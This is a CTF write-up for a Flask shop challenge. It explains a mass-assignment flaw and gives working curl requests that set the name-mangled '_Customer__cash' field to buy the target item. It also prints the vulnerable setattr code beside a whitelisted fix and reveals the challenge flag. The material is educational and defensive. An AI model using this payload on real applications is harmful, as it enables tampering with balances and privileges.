# CTF Write-up: Kariakoo

**Category:** Web
**Challenge Source:** tcraCyber champion 2026
**Write-up Author:** TitoDevsec (T1t0D3v$3c)

## Challenge Summary
The target was a simple shop application (Flask) called "Kariakoo". The goal was to buy a special "BLACK socks" item and retrieve the flag from the page after purchase.

## Vulnerability Analysis
### What was wrong?
The application was vulnerable to **Mass Assignment** (also known as Overposting). During registration, the server took all keys from the user-supplied JSON and set them directly as attributes on the `Customer` object without any filtering or whitelisting.

## Solution
1.  **Code Analysis:** The `register` endpoint used `setattr` to populate the `Customer` object:
    ```python
    for key, value in data.items():
        setattr(customer, key, value)
    ```
2.  **Identification:** The `Customer` class had a "private" cash variable `__cash`. In Python, private fields are name-mangled as `_ClassName__variableName`.
3.  **Exploitation:** Register a new user and include the mangled `_Customer__cash` attribute in the JSON payload to force a high balance.
    ```bash
    curl -i -s -X POST http://<target-ip>:1339/register \
    -H "Content-Type: application/json" \
    --data '{"name":"arch","password":"arch","_Customer__cash":9999999}'
    ```
4.  **Purchase:** Use the returned `token` cookie to buy the "socks" item.
    ```bash
    curl -i -s -X POST http://<target-ip>:1339/buy \
    -H "Content-Type: application/json" \
    -H "Cookie: token=<token>" \
    --data '{"item_id":"socks"}'
    ```
5.  **Result:** Reload the homepage with the same cookie to extract the flag.
    ```bash
    curl -s http://<target-ip>:1339/ -H "Cookie: token=<token>" | grep -oE 'tzcert\{[^}]+\}'
    ```

## Code Comparison

### Vulnerable Code (Mass Assignment)
Trusting client-side JSON keys to populate server-side objects:
```python
# Flask endpoint (Vulnerable)
@app.route('/register', methods=['POST'])
def register():
    data = request.get_json()
    customer = Customer()
    for key, value in data.items():
        setattr(customer, key, value) # Mass Assignment
    # ... save customer
```

### Secure Code
Use a whitelist of allowed attributes or a dedicated data transfer object (DTO) to populate server-side models.
```python
# Flask endpoint (Secure)
@app.route('/register', methods=['POST'])
def register():
    data = request.get_json()
    customer = Customer()
    # Only allow specific, safe attributes
    allowed_keys = ['name', 'password']
    for key in allowed_keys:
        if key in data:
            setattr(customer, key, data[key])
    # ... save customer
```

## Lessons Learned
*   **Mass Assignment:** Never trust client-supplied keys to directly populate server-side objects. Always use a whitelist of allowed attributes.
*   **Python Name Mangling:** "Private" variables in Python (starting with `__`) are not truly private and can be accessed or modified if the mangled name is known.
*   **API Security:** Always validate and sanitize all inputs to an API, including the keys in a JSON payload.

## Flag
`tzcert{16236b7aadc7f5b1767d064571b103d8}`
